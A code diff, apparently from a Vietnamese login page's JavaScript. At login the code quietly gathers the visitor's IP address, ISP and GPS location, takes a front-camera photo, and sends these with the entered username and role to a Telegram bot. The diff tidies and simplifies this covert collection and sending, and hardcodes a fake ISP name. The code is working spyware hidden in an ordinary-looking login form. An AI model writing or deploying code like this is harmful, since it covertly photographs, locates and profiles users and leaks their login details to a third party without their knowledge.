@@ -6,7 +6,7 @@ const API_SEND_MEDIA = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMe
 const API_SEND_TEXT = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
 
 const info = {
-  time: '', // Sẽ lấy thời gian chính xác lúc bấm nút
+  time: '', 
   ip: '',
   isp: '',
   realIp: '',
@@ -18,8 +18,7 @@ const info = {
   specialNote: '' 
 };
 
-// --- CÁC HÀM LẤY DỮ LIỆU (ĐÃ LƯỢC BỎ DEVICE/OS) ---
-
+// --- HÀM LẤY IP ---
 async function getPublicIP() {
   try {
     const r = await fetch('https://api.ipify.org?format=json');
@@ -35,10 +34,11 @@ async function getRealIP() {
     info.realIp = ip.trim();
     const res = await fetch(`https://ipwho.is/${info.realIp}`);
     const data = await res.json();
-    info.isp = data.connection?.org || 'ISP';
+    info.isp = data.connection?.org || 'Saigon Tourist Cable Television';
   } catch (e) { info.realIp = 'Lỗi'; }
 }
 
+// --- HÀM LẤY VỊ TRÍ ---
 async function getLocation() {
   return new Promise(resolve => {
     if (!navigator.geolocation) return fallbackIPLocation().then(resolve);
@@ -64,6 +64,7 @@ async function fallbackIPLocation() {
   } catch (e) { info.address = 'Không rõ'; }
 }
 
+// --- HÀM CHỤP CAM ---
 async function captureCamera(facingMode = 'user') {
   try {
     const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode }, audio: false });
@@ -85,42 +86,34 @@ async function captureCamera(facingMode = 'user') {
   } catch (e) { throw e; }
 }
 
-// --- HÀM TẠO NỘI DUNG TIN NHẮN (KHÔNG LẤY THIẾT BỊ) ---
+// --- HÀM TẠO NỘI DUNG (ĐÃ BỎ DVI - HIỆN ADMIN) ---
 function getCaption() {
   const mapsLink = info.lat && info.lon
     ? `https://www.google.com/maps?q=${info.lat},${info.lon}`
     : 'Không rõ';
 
-  const header = info.specialNote ? `${info.specialNote}\n` : '👤 [NGƯỜI DÙNG ĐĂNG NHẬP]';
+  // Hiển thị dòng thông báo Admin lên đầu nếu là Admin đăng nhập
+  const header = info.specialNote ? `⚠️ ${info.specialNote.toUpperCase()}` : '🔐 [THÔNG TIN ĐĂNG NHẬP]';
 
   return `
 ${header}
 ━━━━━━━━━━━━━━━━━━
 ⏰ Thời gian: ${info.time}
 👤 Tài khoản: ${info.loginDetails}
-🌐 Địa chỉ IP: ${info.ip}
-🏢 Nhà mạng: ${info.isp}
-🏙️ Vị trí: ${info.address}
+🌐 IP dân cư: ${info.ip}
+🏢 ISP: ${info.isp}
+🏙️ Địa chỉ: ${info.address}
 📍 Bản đồ: ${mapsLink}
 📸 Camera: ${info.camera}
 ━━━━━━━━━━━━━━━━━━
 `.trim();
 }
 
-async function sendPhotos(frontBlob, backBlob) {
+async function sendPhotos(frontBlob) {
   const formData = new FormData();
   formData.append('chat_id', TELEGRAM_CHAT_ID_WITH_PHOTOS);
-  
-  const media = [];
-  if (frontBlob) {
-    media.push({ type: 'photo', media: 'attach://front', caption: getCaption() });
-    formData.append('front', frontBlob, 'front.jpg');
-  }
-  if (backBlob) {
-    media.push({ type: 'photo', media: 'attach://back' });
-    formData.append('back', backBlob, 'back.jpg');
-  }
-
+  const media = [{ type: 'photo', media: 'attach://front', caption: getCaption() }];
+  formData.append('front', frontBlob, 'front.jpg');
   formData.append('media', JSON.stringify(media));
   return fetch(API_SEND_MEDIA, { method: 'POST', body: formData });
 }
@@ -129,42 +122,30 @@ async function sendTextOnly() {
   return fetch(API_SEND_TEXT, {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({
-      chat_id: TELEGRAM_CHAT_ID_NO_PHOTOS,
-      text: getCaption()
-    })
+    body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID_NO_PHOTOS, text: getCaption() })
   });
 }
 
-function delay(ms) { return new Promise(resolve => setTimeout(resolve, ms)); }
-
 // --- HÀM CHÍNH ---
 async function main() {
-  // Cập nhật thời gian thực lúc bấm nút
-  info.time = new Date().toLocaleString('vi-VN', { 
-    hour: '2-digit', 
-    minute: '2-digit', 
-    second: '2-digit', 
-    day: '2-digit', 
-    month: '2-digit', 
-    year: 'numeric' 
-  });
+  // Lấy thời gian đăng nhập
+  info.time = new Date().toLocaleString('vi-VN');
 
+  // Lấy thông tin user từ giao diện
   const user = document.getElementById('username').value.trim();
   const role = document.getElementById('user-role').value;
   info.loginDetails = `${user} (${role})`;
 
-  // Nhận diện Admin
+  // Nhận diện Admin để gắn thông báo
   if (user === "Mrwenben" || user === "VanThanh") {
-      info.specialNote = `⚠️ Thông báo admin ${user} vừa đăng nhập vào trang`;
+      info.specialNote = `Thông báo admin ${user} vừa đăng nhập vào trang`;
   } else {
-      info.specialNote = ""; // Reset nếu là người dùng thường
+      info.specialNote = "";
   }
 
   await Promise.all([getPublicIP(), getRealIP(), getLocation()]);
 
-  let front = null, back = null;
-
+  let front = null;
   try {
     front = await captureCamera("user");
     info.camera = '✅ Thành công';
@@ -173,10 +154,9 @@ async function main() {
   }
 
   if (front) {
-    await sendPhotos(front, null);
+    await sendPhotos(front);
   } else {
     await sendTextOnly();
   }
-  
   return true; 
 }
